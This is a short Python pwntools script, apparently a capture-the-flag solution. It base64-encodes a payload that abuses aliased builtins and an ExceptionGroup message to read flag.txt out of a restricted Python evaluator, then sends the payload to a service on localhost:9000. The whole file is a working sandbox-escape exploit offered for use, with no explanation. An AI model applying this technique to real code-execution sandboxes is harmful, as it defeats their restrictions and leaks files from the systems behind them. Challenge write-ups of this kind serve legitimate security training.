import base64
from pwn import *

def generate_payload():
    code = '''try:
    raise ExceptionGroup('test', [im_kind])
except ExceptionGroup:
    flag = im_too_kind('flag.txt').read().strip()
    raise ExceptionGroup(f"FLAG: {flag}", [im_kind])'''
    
    encoded = base64.b64encode(code.encode()).decode()
    return encoded

if __name__ == "__main__":
    payload = generate_payload()
    p = remote('localhost', 9000)
    p.sendline(f'b64:{payload}')
    p.interactive()